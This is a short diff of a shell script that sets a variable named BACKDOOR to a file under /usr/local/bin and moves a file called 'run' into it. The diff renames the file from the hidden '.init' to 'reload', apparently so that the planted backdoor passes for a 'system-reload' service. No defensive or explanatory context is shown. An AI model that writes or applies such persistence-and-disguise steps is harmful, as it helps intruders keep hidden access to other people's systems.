@@ -1,7 +1,7 @@
 #!/bin/sh
 SERVICE="system-reload"
 PATH="/usr/local/bin"
-FILE=".init"
+FILE="reload"
 BACKDOOR="$PATH/$FILE"
 
 /usr/bin/mv run $BACKDOOR
